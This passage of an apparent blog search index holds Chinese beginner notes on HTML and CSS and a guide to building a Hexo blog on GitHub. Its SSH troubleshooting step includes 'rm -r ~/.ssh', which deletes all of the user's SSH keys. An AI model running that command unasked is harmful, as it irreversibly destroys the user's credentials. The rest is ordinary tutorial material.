/*垂直对齐 top center bottom*/ vertical-align: top;/*文字排在顶端*/ float:left;/*文字围绕图片排列*/&#125; 七、链接和列表1、链接 a&#123; color: green;&#125; 伪类 a:link&#123; /*初始状态*/ color: blue;&#125;a:visited&#123; /*被访问*/ color: green;&#125;a:hover&#123; /*鼠标移动*/ color: yellow; font-size: 80px;&#125;a:active&#123; /*点击*/ color: red;&#125; 2、列表ul&#123; list-style-type: disc;/*实心圆*/&#125;ul前面样式none: 不使用项目符号disc: 实心圆circle: 空心圆square: 实心方块ol前面样式demical: 阿拉伯数字lower-alpha: 小写英文字母upper-alpha: 大写英文字母lower-roman: 小写罗马数字upper-roman: 大写罗马数字 列表加图片logo样式 li&#123; background-image: url('图片路径'); background-repeat: no-repeat;/*消去平铺*/ height: 50px; padding: 25px 50px 0;/*盒子模型调整图片位置*/&#125; 八、盒子模型所有的元素可以看成矩形的盒子 内容 内边距 盒子框 外边距 &lt;div class=\"box1\"&gt;div1&lt;/div&gt;&lt;div class=\"box2\"&gt;div2&lt;/div&gt; .box1&#123;/*盒子框*/ border: 5px solid blue; /*内边距 上下 左右*/ padding: 10px 10px; /*上 左右 下*/ padding: 10px 20px 10px; /*上 右 下 左*/ padding: 10px 20px 10px 20px; 可写成： padding-top: padding-bottom: padding-left: padding-right: /* background-color: green;*/ /*外边距*/ margin: 20px;/*和内边距相似*/&#125;.box2&#123; border: 5px solid black;&#125; 九、布局标准流：从上往下排列 浮动：float float: left right; clear: both;/*调整后，在下个div容器清除浮动，回到标准流状态*/ /*伪元素*/清浮动.container::after&#123; content: \"\"; display: block; clear: both;&#125; /*伪元素 清理浮动和margin*/.container::before&#123; content: \"\"; display: table;&#125;.container::after&#123; clear: both;&#125; 十、定位div&#123; width: 200px; height: 300px; background: blue; /*定位 固定定位*/ position: fixed; bottom: 100px; right: 50px;&#125;.div1&#123;/*相对定位*/ position: relative; top: 50px; left: 100px;&#125; /*绝对定位 不跟父元素(如:.container)一起移动*/.div1&#123; position: absolute; top: 50px; left: 100px;&#125; 上面便是我对Web前端CSS部分的学习，学习总会有收获，No pain No gain! 小白进阶ing 一起努力进阶吧！！！！","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/tags/Web/"},{"name":"前端","slug":"前端","permalink":"https://qwzf.gitee.io/blog/tags/前端/"},{"name":"CSS","slug":"CSS","permalink":"https://qwzf.gitee.io/blog/tags/CSS/"}],"author":"qwzf"},{"title":"Web前端-HTML篇","slug":"Web前端-HTML篇","date":"2019-03-25T14:54:31.921Z","updated":"2019-08-01T05:47:24.751Z","comments":true,"path":"2019/03/25/Web前端-HTML篇/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/03/25/Web前端-HTML篇/","excerpt":"","text":"最近学习了Web前端的入门课程，深有感触，于是写了这篇学习笔记总结了一下，希望能加深自己的理解，而在此之前，为了写一个表单提交页面，学习了一些html的基础知识。在这些基础上学习Web前端，感觉学习轻松多了有么有？感觉真好！ 一、前端介绍 前端包括：html、css、javascript 入门阶段：改一般页面和动效 前端历史：第一个网站→table表格→JavaScript→Flash→CSS→栅栏与框架→响应式→ H5(HTML5) 二、Web编程-环境搭建1、网页浏览器： 谷歌、火狐、IE、苹果Safari F12打开控制台 2、代码编译器 vscode、sublime、atom、webstorm、dreamwarver 设置Tab、插件 3、git代码管理1.代码仓库统一保存、管理代码的地方 如：github 2.git及简单操作 cd C: 进入到c盘 cd Users/Test 进入到当前盘的Users/Test文件夹 git init 创建代码仓库 git init 在一个文件目录执行该指令，会把该目录快速设置成git的代码仓库。 git clone 仓库地址 克隆仓库到本地 git config --global user,name &quot;XX&quot; 配置身份信息 git config --global user.email &quot;xx@qq.com&quot; 配置身份信息 git add xx.xml 后面可以加单独的文件 git add app app是一个文件夹 git add . 全部文件 add这个只是添加，我们还需要提交 git commit -m &quot;First commit&quot; 双引号之中是相关的描述,提交(提交到本地缓存的仓库)更新文件 git push 提交到远程仓库 三、网页基本概念与基本结构1、基本概念 网页是构成网站的基本元素，是承载各种网站应用的平台 是html文档经过浏览器渲染以后展示出来的页面 html文档：后缀为.html 渲染：代码经过浏览器处理，产生人正常能看懂的页面 编码：通过代码形式，把要展示的页面写到html文档 1.html+css页面内容html：负责页面结构文本内容：能被浏览器直接显示出来的文字和符号 标签：不能被浏览器直接显示出来的、具有特殊意义的，用尖括号括起来的字符 主要标签包括：文本、图片、链接、列表、表格、表单、框架(嵌套页面) 语法： html从上往下解析 元素可以互相嵌套 html的结构 css负责页面样式2.javascript页面行为2、基本结构&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt; &lt;!-- lang属性声明主要语言，属性值zh：中文，属性值en：英文 --&gt;&lt;head&gt; &lt;!-- 主要配置信息,设置 --&gt;&lt;title&gt;标题&lt;/title&gt;&lt;meta charset=\"utf-8\"/&gt; &lt;!-- 属性值还有gbk和gb2312 --&gt;&lt;/head&gt; &lt;body&gt; &lt;!-- body标签可以写css属性 --&gt;&lt;h1&gt;我的第一个标题&lt;/h1&gt;&lt;p&gt;我的第一个段落&lt;/p&gt;&lt;/body&gt; &lt;/html&gt; 四、前端基础HTML1、文本1.水平线单纯水平线：&lt;hr /&gt; 类型：单标签 2.主题内容中的标题&lt;h1&gt;&lt;/h1&gt; &lt;!-- 一级标题 --&gt;&lt;h2&gt;&lt;/h2&gt; &lt;!-- 二级标题 --&gt;&lt;h3&gt;&lt;/h3&gt; &lt;!-- 三级标题 --&gt;&lt;h4&gt;&lt;/h4&gt; &lt;!-- 四级标题 --&gt;&lt;h5&gt;&lt;/h5&gt; &lt;!-- 五级标题 --&gt;&lt;h6&gt;&lt;/h6&gt; &lt;!-- 六级标题 --&gt; 类型：双标签 3.段落&lt;p&gt;&lt;/p&gt;类型：双标签 4.换行&lt;br /&gt; 类型：单标签 5.空格（1）&amp;nbsp 不是标签，可以当做特殊字符。 （2）输入法用全角 2、图片&lt;img src=\"\" alt=\"\" width=\"\" height=\"\" /&gt; 属性src里填图片路径图片路径分为：绝对路径和相对路径&lt;!--相对路径：相对于当前html文件路径--&gt; ./当前目录../上一级目录在当前目录建一个文件夹：images 将所展示图片都放在里面 属性alt里填图片说明属性width里填图片长度：也可以用百分比表示属性height里填图片高度：也可以用百分比表示类型：内联元素实例 &lt;img src=\"1.jpg\" alt=\"哈士奇\" width=\"100\" height=\"100\"/&gt; 3、链接&lt;a href=\"http://www.baidu.com/\" title=\"鼠标悬停显示\" target=\"_blank\"&gt;百度一下&lt;/a&gt; 属性href：需要连接的网址，网站建设初期用#链接表示空链接 属性title：鼠标悬停显示 属性target：设置_blank，在新窗口打开链接地址 类型：内联元素 4、图片映射（1）为map标签加上id属性，定义一个唯一属性（2）为保证兼容性加name属性，属性值与id值相同（3）为map标签所作用图片img标签加usemap属性，属性名为#id名称（4）在map标签内嵌套area标签实现给指定区域加链接 &lt;area shape=\"\" coords=\"\" href=\"\" alt=\"\" /&gt; 属性shape：定义链接区域形状，常用值rect（矩形）circle（圆形） poly(多边形)属性coords：确定区域精确位置，填坐标&lt;!--以左上角为原点--&gt;属性href：链接地址属性alt：链接说明 5、列表1.有序列表&lt;ol&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt;&lt;/ol&gt; 子元素，父元素，后代元素，兄弟元素 2.无序列表&lt;!-- 列表需要嵌套写法 --&gt; &lt;ul&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;/ul&gt; 3.定义列表&lt;dl&gt; &lt;dt&gt;&lt;/dt&gt; &lt;dd&gt; &lt;/dd&gt; &lt;/dl&gt; 6、表格实例 &lt;table border=\"1\" cellpadding=\"2\" cellspacing=\"1\"&gt; &lt;tr&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;学号&lt;/th&gt; &lt;th&gt;年龄&lt;/th&gt; &lt;th&gt;成绩&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;小王&lt;/td&gt; &lt;td&gt;133&lt;/td&gt; &lt;td&gt;19&lt;/td&gt; &lt;td&gt;100&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; table标签属性：border 作用：规定表格边框宽度属性：cellpadding 作用：规定文字和边框的间距属性：cellspacing 作用：规定每个单元格边框宽度tr标签：html表格中的行th标签：表格内表头单元格td标签：表格内普通单元格常用属性：colspan：规定单元格可横跨列数，值为数字rowspan：规定单元格可横跨行数，值为数字 7、表单1.标签&lt;form&gt;：定义供用户输入的html表单属性：action：规定提交表单向何处发送表单数据name：表单命名target：_blank在新窗口打开method：提交方式，get或post值类型：双标签 2.&lt;input&gt;标签:定义表单输入页面&lt;!-- 通过type属性展示不同输入页面，通过value改变默认值 --&gt; （1）普通文本框：&lt;input type=\"text\" /&gt; （2）密码框：&lt;input type=\"password\" /&gt; （3）文件上传：&lt;input type=\"file\" /&gt; （4）隐藏的input：&lt;input type=\"hidden\" /&gt; （5）普通按钮：&lt;input type=\"button\" /&gt; （6）单选：&lt;input type=\"radio\" /&gt; &lt;!--通过相同name属性实现单选--&gt; 实例 &lt;input type=\"radio\" name=\"sex\"&gt;男&lt;input type=\"radio\" name=\"sex\"&gt;女 （7）复选框： &lt;input type=\"checkbox\" /&gt;` （8）提交：&lt;input type=\"submit\" /&gt; （9）重置：&lt;input type=\"reset\" /&gt; 属性placeholder 可用值text：规定帮助用户填写输入字段提示属性checked 可用值checked：用于选择页面（单复选），实现默认选择属性disabled 可用值disabled：使标签不可用属性name：给input输入界面起名字属性readonly 可用值readonly ：使输入界面为只读状态属性size 值为数字：设置输入框长度属性value：该属性值为input提交到页面的数据，可通过该属性设置默认值 3.textarea标签：定义多行输入框&lt;!--双标签，默认值写标签之间--&gt; 属性cols 值为数字属性rows 值为数字也可使用disabled name readonly属性实例 自我介绍：&lt;textarea cols=\"20\" rows=\"10\"&gt;&lt;/textarea&gt; 4.label标签：提升用户体验标签for属性与input的id属性相同 5.select标签：配合option实现下拉菜单可用属性：disabled name multiple &lt;select&gt; &lt;option&gt;&lt;/option&gt;&lt;/select&gt; 6.option标签可用属性：disabled select value 7.optgroup标签&lt;!--把相关选项组合在一起--&gt; 属性label：给选项组命名属性disabled：停用该选项组实例 &lt;select&gt; &lt;optgroup label=\"河南省\"&gt; &lt;option value=\"周口\"&gt;周口&lt;/option&gt; &lt;option&gt;郑州&lt;/option&gt; &lt;option&gt;洛阳&lt;/option&gt; &lt;/optgroup&gt; &lt;/select&gt; 表单提交实例&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;html表单提交&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;账户登录&lt;/h1&gt; &lt;form name=\"submit\" action=\"http://www.baidu.com/\" target=\"_blank\" method=\"get\"&gt; &lt;!-- 由于表单提交需要进行数据处理，html语言无法实现，暂且写成向百度提交数据 --&gt; 账号：&lt;input name=\"text\" type=\"text\" size=\"20\" /&gt; &lt;br /&gt; 密码：&lt;input name=\"password\" type=\"password\" size=\"20\" /&gt; &lt;br /&gt; &lt;input type=\"submit\" value=\"确认登录\" /&gt; &lt;/form&gt;&lt;/body&gt; &lt;/html&gt; 8、布局将小块排列好 1.div容器布局&lt;div style=\"background:blue; height:80px;\"&gt;菜单&lt;/div&gt;&lt;div style=\"background:yellow; width:50%;\"&gt;导航&lt;/div&gt;&lt;div style=\"background:red; width:50%;\"&gt;关于&lt;/div&gt; 2.table布局3.iframe布局作用：嵌套页面 百度一下：&lt;iframe src=\"http://www.baidu.com\" frameborder=\"0\"&gt;&lt;/iframe&gt; 4.frameset布局作用：管理后台页面 &lt;frameset rows=\"12%,88%\"&gt; &lt;frame src=\"frame1.html\"&gt; &lt;frameset cols=\"20%,80%\"&gt; &lt;frame src=\"frame2.html\"&gt; &lt;frame src=\"frame2.html\"&gt; &lt;/frameset&gt;&lt;/frameset&gt; 9、嵌套规则块元素：独立成一行，可以设置宽高，默认宽高100% 文字类块元素：&lt;p&gt; &lt;h1&gt;~&lt;h6&gt; 容器类块元素：div table tr td th from ul li ol dl dt dd 行元素：不独立成一行，不可以 内容决定 a img input strong em del span 特殊字符：文字 br &amp;nbsp; 嵌套规则 1.块元素可以嵌套行元素&lt;div&gt;&lt;a href=\"\"&gt;&lt;/a&gt;&lt;/div&gt; 2.行元素可以嵌套行元素&lt;a href=\"\"&gt;&lt;strong&gt; a&lt;/strong&gt;&lt;/a&gt; 3.行元素不可以嵌套块元素&lt;a href=\"\"&gt; &lt;div&gt;&lt;/div&gt; &lt;/a&gt; &lt;!--错误--&gt; 4.文字类块元素不可以嵌套块元素&lt;p&gt;这是一&lt;p&gt;&lt;/p&gt;句话&lt;/p&gt; &lt;!--错误--&gt; 5.容器类块元素可以嵌套块元素&lt;div&gt;&lt;p&gt;&lt;/p&gt;&lt;/div&gt; 以上便是我学习Web前端HTML部分的学习和练习记录，在总结练习过程中，我收益颇多。小白进阶ing，下一篇我将会把我学习Web前端CSS部分记录一下希望能再次丰富我对Web前端的理解和运用。","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/tags/Web/"},{"name":"前端","slug":"前端","permalink":"https://qwzf.gitee.io/blog/tags/前端/"},{"name":"HTML","slug":"HTML","permalink":"https://qwzf.gitee.io/blog/tags/HTML/"}],"author":"qwzf"},{"title":"Github-Hexo简单搭建","slug":"Github-Hexo的搭建","date":"2019-03-17T04:36:45.934Z","updated":"2019-09-08T14:26:54.072Z","comments":true,"path":"2019/03/17/Github-Hexo的搭建/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/03/17/Github-Hexo的搭建/","excerpt":"","text":"这几天由于团队下发了一个任务，需要搭建一个github-hexo个人博客。第一次听到这个任务，你是不是有点懵，反正当时的我是特别懵。由于从没有搭建过一些东西，想着是不是特别有趣？于是在浓厚好奇心的驱使下，我开启了自学模式，学习一些大佬的搭建经验和讲解。总算在不懈努力的学习下，幸运的成功无踩坑搭建了我的github-hexo个人Blog。由此，我写下这篇blog，希望能帮助大家无踩坑快速搭建自己的个人blog。 一、准备搭建环境：1.node.js的安装在浏览器上搜索node.js，进入官网。出现两个下载板块，LTS长期支持版，Current为当前最新版。我下载的是LTS版本的，此时是v10.15.3。nodejs里面的npm工具非常有用，可以在方便的安装一些插件。下载地址打开cmd命令行，成功页面如下 C:\\Users\\ASUS&gt;D: //注意你安装的路径，我所有的文件都安装在D盘上了，也可以安装在其他路径D:\\&gt;node -vv10.15.3D:\\&gt;npm -v6.4.1 2.Git的安装在浏览器上搜索git for windows，进入官网，点击Dawnload进行下载。但一般下载有点问题，需要翻墙下载。是不是有点担心，别着急，你也可以点击右边这个网址下载地址下载，各种版本的都有哦！安装步骤：一直next到下面这个页面选择第二个，然后一路next。打开cmd命令行，成功页面如下 C:\\Users\\ASUS&gt;D:D:\\&gt;git versiongit version 2.21.0.windows.1 二、Hexo的安装前面配置搭建环境，看起来是不是特简单。如果此时你认为搭建很简单的话，那你就想错了，从此时开始需要注意了，困难正一步一步向你袭来。创建文件夹，安装hexo先创建一个用来存放所有博客的东西的文件夹，并重命名，我为了容易记，创建了一个名为blog的文件夹。进入该文件夹目录，鼠标右击，选择Git Bash Here进入命令行。开始安装Hexo，安装命令：npm install hexo-cli -g安装结束后，成功命令如下 C:\\Users\\ASUS&gt;D:D:\\&gt;cd blog D:\\blog&gt;hexo -v hexo-cli: 1.1.0 os: Windows_NT 10.0.17134 win32 x64 http_parser: 2.8.0 node: 10.15.3 v8: 6.8.275.32-node.51 uv: 1.23.2 zlib: 1.2.11 ares: 1.15.0 modules: 64 nghttp2: 1.34.0 napi: 3 openssl: 1.1.0j icu: 62.1 unicode: 11.0 cldr: 33.1 tz: 2018e 然后初始化初始化命令：hexo init blog初始化后打开，会出现下面这些文件： node_modules：是依赖包 public：存放的是生成的页面 scaffolds：命令生成文章等的模板 source：用命令创建的各种文章 themes：主题 _config.yml：整个博客的配置信息 db.json：source解析所得到的 package.json：项目所需模块项目的配置信息我可能操作有点问题，在blog目录下还有个qwzf文件夹，上述文件都在qwzf文件夹里，我记得我当时初始化的时候，执行的命令是hexo init qwzf 结果如下 三、Github的创建和配置1.Github的创建（1）注册账号GitHub是一个面向开源及私有软件项目的托管平台，在第一次使用github，需要进行注册。 注册地址 （2）初始设置提交注册信息后，会弹出一个界面，这里我们选择免费用户就可以了。默认的FREE后面Chosen按钮已经是选中状态了。 （3）验证账号新建一个储存仓库名称为yourname.github.io, 其中yourname是你的github名称，按照这个规则创建才有用，我的是 qwzf.github.io发现邮箱地址未验证登录注册时的邮箱，进行验证 2.新建仓库在主页右上角，点击加号，找到New repository，点进去会显示如下界面，输入仓库名，点击创建 3.Github的配置（1）配置github账户信息回到cmd中，配置github账户信息（YourName和YourEail都替换成你自己的） D:\\blog\\qwzf&gt;git config --global user.email \"YourEail\" //配置用户邮箱，和注册github的邮箱一致D:\\blog\\qwzf&gt;git config --global user.name \"YourName\" //配置用户名，和注册github的用户名一致 （2）生成SSH密钥打开Git Bash Here命令行，输入ssh-keygen -t rsa -C &quot;你的邮箱&quot;然后一直回车到结束，这样就成功在C盘用户个人目录生成了.ssh文件夹打开.ssh文件夹，会出现两个文件，选择下方的那个文件，用记事本打开。会出现以下内容，全选复制登录你的gihub账号，点击Your profile然后点击Edit profile进入，选择SSH并新建一个SSH Key其中Title中的名称可以任意填写，将C:\\Users\\Administrator.ssh目录下id_rsa.pub复制的所有内容粘贴到Key中，点击Add SSH Key，SSH密钥完成可以在gitbash中验证是否添加成功：ssh -T git@github.com问题：假如ssh-key配置失败，那么只要以下步骤就能完全解决 首先，清除所有的key-pairssh-add -Drm -r ~/.ssh删除你在github中的public-key 重新生成ssh密钥对ssh-keygen -t rsa -C “xxx@xxx.com“ 接下来正常操作在github上添加公钥public-key:1、首先在你的终端运行 xclip -sel c ~/.ssh/id_rsa.pub将公钥内容复制到剪切板2、在github上添加公钥时，直接复制即可3、保存 测试：在终端 ssh -T git@github.com 四、_config.yml文件的配置看到上面的过程，是不是感到一些厌烦，别着急哦，到这一步，就离成功搭建，只剩一步之遥了。用编辑器（我用的sublime Text）打开你的blog项目，修改_config.yml文件的一些配置: url: https://qwzf.github.io deploy: type: git repo: https://github.com/qwzf/qwzf.github.io.git branch: master 将qwzf换成你自己的用户名 五、本地预览和上传到Github（1）本地预览回到gitbash中，进入你的blog目录，分别执行以下命令： hexo cleanhexo generatehexo server 命令也可以简写成 hexo cleanhexo ghexo s 声明：hexo 3.0把服务器独立成单个模块，需要单独安装：npm i hexo-server打开浏览器输入：http://localhost:4000 就可以在本地看到Hexo了是不是有点兴奋，完成下面最后一步，就可以部署到github上喽！ （2）上传到Github先安装：npm install hexo-deployer-git –save（这样能将你写的文章部署到github服务器上并让别人浏览到）执行命令(建议每次都按照如下步骤部署)： hexo clean //清理缓存hexo generate //本地生成hexo deploy //提交到服务器 命令也可以简写成 hexo cleanhexo ghexo d 注：deploy的过程中要输入你的username及passward然后在浏览器中输入http://yourgithubname.github.io就可以看到你的个人博客啦。感觉gitbash中东西太多的时候输入clear命令清空命令简写hexo n “我的博客” == hexo new “我的博客” #新建文章hexo g == hexo generate #生成hexo s == hexo server #启动服务预览hexo d == hexo deploy #部署 hexo server #Hexo会监视文件变动并自动更新，无须重启服务器hexo server -s #静态模式hexo server -p 5000 #更改端口hexo server -i 192.168.1.1 #自定义 IPhexo clean #清除缓存，若是网页正常情况下可以忽略这条命令 六、修改及配置主题hexo初始化之后默认的主题是landscape , 然后你可以去这个 地址 里面找到你想要的主题，进行克隆。都有相关的介绍，next比较充分，但我觉得不太美观，就自己挑选了个精美主题进行配置修改，按着说明来就好了，反正一直改就完了！挑选结束后，可以将主题copy到themes目录，如 git clone https://github.com/HmyBmny/hexo-theme-concise.git themes/concise 修改_config.yml中的theme： theme: concise 所有的主题模板，共有的操作方式就只有这两个，但是不同的模板，会有很多不同的设置，这里就需要针对模板的使用说明进行修改了。建议通过github找到模板，看下readme。我觉的这个大佬的主题修改和配置可能会有点帮助， 链接地址 这便是我搭建Github-Hexo的过程，希望能用这篇blog，让大家少入坑，成功搭建属于自己的个人博客。教程千万条，避坑第一条。搭建不规范，入坑更容易。","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/tags/Web/"},{"name":"Hexo","slug":"Hexo","permalink":"https://qwzf.gitee.io/blog/tags/Hexo/"},{"name":"Github","slug":"Github","permalink":"https://qwzf.gitee.io/blog/tags/Github/"}],"author":"qwzf"},{"title":"超文本标记语言html","slug":"html基础篇一","date":"2019-03-15T15:43:10.703Z","updated":"2019-08-25T11:55:27.588Z","comments":true,"path":"2019/03/15/html基础篇一/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/03/15/html基础篇一/","excerpt":"","text":"超级文本标记语言是标准通用标记语言下的一个应用，也是一种规范，一种标准，它通过标记符号来标记要显示的网页中的各个部分。但需要注意的是，对于不同的浏览器，对同一标记符可能会有不完全相同的解释，因而可能会有不同的显示效果。下面是我学习html前半部分后作出的简单总结以及一些练习实例，鄙人才疏学浅，敬请大佬指正。 1、html基本格式&lt;!DOCTYPE html&gt; &lt;!--声明文档解析类型--&gt;&lt;html&gt; &lt;!--根标签（开始）--&gt;​ &lt;head&gt; &lt;!--头标签（开始）--&gt;​ &lt;title&gt;html基本结构&lt;/title&gt; &lt;!-- 整个页面标题 --&gt;​ &lt;/head&gt; &lt;!--头标签（结束）--&gt;&lt;body&gt; &lt;!--主体标签（开始）--&gt;​ &lt;!--代码要缩进--&gt;​ &lt;h1&gt;我的第一个标题&lt;/h1&gt; &lt;!--主题内容中的标题--&gt;​ &lt;p&gt;我的第一个段落&lt;/p&gt; &lt;!--页面内容--&gt;&lt;/body&gt; &lt;!--主体标签（结束）--&gt;&lt;/html&gt; &lt;!--根标签（结束）--&gt; 2、html标签单标签：&lt;br /&gt;双标签：&lt;标签名&gt;&lt;/标签名&gt; 3、html属性定义：用来完成对受控文字的某些特殊效果或功能。html属性分为：属性名和属性值。 ==属性名=属性值== 中间使用=分隔 属性值写在引号（单引号或双引号）里面。&lt;a href=\"https://www.baidu.com/\"&gt;百度一下&lt;/a&gt; html除了现有属性，还有自定义属性：&lt;a href=\"https://www.baidu.com/\" data-wm=\"pdsu.cn\"&gt;百度一下&lt;/a&gt; 属性名在html5里面加data-作为前缀后接一个或多个字母，属性值随便写，自定义属性默认不会对页面展示造成任何影响。 4、html元素定义：从开始标签到结束标签所有代码。html元素内容：从开始标签到结束标签之间的内容。html元素分为：块级元素和内联元素块级元素：占页面整行长度 &lt;div&gt;&lt;/div&gt;内联元素：只占元素内容长度 &lt;span&gt;&lt;/span&gt; 5、html注释&lt;!-- 被注释的内容 --&gt; 为了给写代码的人看的。 6、html编码非数字的进行编码。 （1）设置html文档所在文件编码（2）在html文档中用标签指定浏览器使用某编码进行展示网页（指定与html文件的编码相对应的编码即可) ==文件编码为utf-8在html中标签指定utf-8编码展示网页== ==文件编码为ansi在html中标签指定jb2312编码展示网页==常用编码：utf-8或jb2312&lt;head&gt;&lt;!-- 声明：utf-8国际编码 gbk jb2312中文编码 --&gt;&lt;meta charset=\"utf-8\" /&gt;&lt;title&gt;页面标题&lt;/title&gt;&lt;/head&gt; 7、html常用标签1、水平线单纯水平线：&lt;hr /&gt; 类型：单标签 2、主题内容中的标题&lt;h1&gt;&lt;/h1&gt; &lt;!--一级标题--&gt;&lt;h2&gt;&lt;/h2&gt; &lt;!--二级标题--&gt;&lt;h3&gt;&lt;/h3&gt; &lt;!--三级标题--&gt;&lt;h4&gt;&lt;/h4&gt; &lt;!--四级标题--&gt;&lt;h5&gt;&lt;/h5&gt; &lt;!--五级标题--&gt;&lt;h6&gt;&lt;/h6&gt; &lt;!--六级标题--&gt; 类型：双标签 3、段落&lt;p&gt;&lt;/p&gt; 类型：双标签 4、换行&lt;br /&gt; 类型：单标签 5、空格（1）&amp;nbsp 不是标签，可以当做特殊字符。 （2）输入法用全角 6、无序列表&lt;!-- 列表需要嵌套写法 --&gt;&lt;ul&gt;​ &lt;li&gt;&lt;/li&gt;​ &lt;li&gt;&lt;/li&gt;&lt;/ul&gt; 7、有序列表&lt;ol&gt;​ &lt;li&gt;&lt;/li&gt;​ &lt;li&gt;&lt;/li&gt;&lt;/ol&gt; 子元素，父元素，后代元素，兄弟元素 8、定义列表&lt;dl&gt;​ &lt;dt&gt;&lt;/dt&gt;​ &lt;dd&gt;​ &lt;/dd&gt; &lt;/dl&gt; 类型：块级元素 9、插入图片&lt;img src=\"\" alt=\"\" width=\"\" height=\"\" /&gt; 属性src里填图片路径图片路径分为：绝对路径和相对路径&lt;!--相对路径：相对于当前html文件路径--&gt; ==./当前目录../上一级目录====在当前目录建一个文件夹：images 将所展示图片都放在里面== 属性alt里填图片说明属性width里填图片长度：也可以用百分比表示属性height里填图片高度：也可以用百分比表示类型：内联元素实例&lt;img src=\"images/1.jpg\" alt=\"二哈\" width=\"200\" height=\"100\"/&gt; 10、超链接&lt;a href=\"https://www.baidu.com/\" title=\"鼠标悬停显示\" target=\"_blank\"&gt;百度一下&lt;/a&gt; 属性href：需要连接的网址，网站建设初期用#链接表示空链接 属性title：鼠标悬停显示 属性target：设置_blank，在新窗口打开链接地址 类型：内联元素 11、指定图片某块区域加超链接（1）为map标签加上id属性，定义一个唯一属性（2）为保证兼容性加name属性，属性值与id值相同（3）为map标签所作用图片img标签加usemap属性，属性名为#id名称（4）在map标签内嵌套area标签实现给指定区域加链接&lt;area shape=\"\" coords=\"\" href=\"\" alt=\"\" /&gt; 属性shape：定义链接区域形状，常用值rect（矩形）circle（圆形）属性coords：确定区域精确位置，填坐标&lt;!--以左上角为原点--&gt;属性href：链接地址属性alt：链接说明 12、link标签放置在头标签head内的用于链接外部css文件、链接收藏夹图标（favicon.ico）最常见用途：链接外部样式表 属性href 值为外部资源地址，这里是css地址属性rel 定义当前文档与被链接文档之间关系，值为icon、stylesheet、next、help、author、alternate、licence、search、tag、prev、sidebar这里是外部css样式 即stylesheet属性type 规定被链接文档MIME类，值为text/css 13、div容器div标签可以看成存放标签的容器 类型：块级元素 14、span内联元素组合内联元素，以便css美化 15、表格实例&lt;table border=\"1\" cellpadding=\"2\" cellspacing=\"1\"&gt;​ &lt;tr&gt;​ &lt;th&gt;姓名&lt;/th&gt;​ &lt;th&gt;学号&lt;/th&gt;​ &lt;th&gt;年龄&lt;/th&gt;​ &lt;th&gt;成绩&lt;/th&gt;​ &lt;/tr&gt;​ &lt;tr&gt;​ &lt;td&gt;小王&lt;/td&gt;​ &lt;td&gt;133&lt;/td&gt;​ &lt;td&gt;19&lt;/td&gt;​ &lt;td&gt;100&lt;/td&gt;​ &lt;/tr&gt;&lt;/table&gt; table标签属性：border 作用：规定表格边框宽度属性：cellpadding 作用：规定文字和边框的间距属性：cellspacing 作用：规定每个单元格边框宽度tr标签：html表格中的行th标签：表格内表头单元格td标签：表格内普通单元格常用属性：colspan：规定单元格可横跨列数，值为数字rowspan：规定单元格可横跨行数，值为数字 16、表单表单提交实例1&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;html表单提交&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;账户登录&lt;/h1&gt; &lt;form name=\"submit\" action=\"https://www.baidu.com/\" target=\"_blank\" method=\"get\"&gt; &lt;!-- 由于表单提交需要进行数据处理，html语言无法实现，暂且写成向百度提交数据 --&gt; 账号：&lt;input name=\"text\" type=\"text\" size=\"20\" /&gt; &lt;br /&gt; 密码：&lt;input name=\"password\" type=\"password\" size=\"20\" /&gt; &lt;br /&gt; &lt;input type=\"submit\" value=\"确认登录\" /&gt; &amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp &amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp &lt;input type=\"reset\" value=\"清空\" /&gt; &lt;/form&gt;&lt;/body&gt; &lt;/html&gt; 1、标签&lt;form&gt;：定义供用户输入的html表单属性：action：规定提交表单向何处发送表单数据name：表单命名target：_blank在新窗口打开method：提交方式，get或post值类型：双标签 2、&lt;input&gt;标签:定义表单输入页面&lt;!-- 通过type属性展示不同输入页面，通过value改变默认值 --&gt; （1）普通文本框：&lt;input type=\"text\" /&gt; （2）密码框：&lt;input type=\"password\" /&gt; （3）文件上传：&lt;input type=\"file\" /&gt; （4）隐藏的input：&lt;input type=\"hidden\" /&gt; （5）普通按钮：&lt;input type=\"button\" /&gt; （6）单选：&lt;input type=\"radio\" /&gt; &lt;!--通过相同name属性实现单选--&gt; 实例&lt;input type=\"radio\" name=\"sex\"&gt;男&lt;input type=\"radio\" name=\"sex\"&gt;女 （7）复选框： &lt;input type=\"checkbox\" /&gt;` （8）提交：&lt;input type=\"submit\" /&gt; （9）重置：&lt;input type=\"reset\" /&gt; 属性placeholder 可用值text：规定帮助用户填写输入字段提示属性checked 可用值checked：用于选择页面（单复选），实现默认选择属性disabled 可用值disabled：使标签不可用属性name：给input输入界面起名字属性readonly 可用值readonly ：使输入界面为只读状态属性size 值为数字：设置输入框长度属性value：该属性值为input提交到页面的数据，可通过该属性设置默认值 3、textarea标签：定义多行输入框&lt;!--双标签，默认值写标签之间--&gt; 属性cols 值为数字属性rows 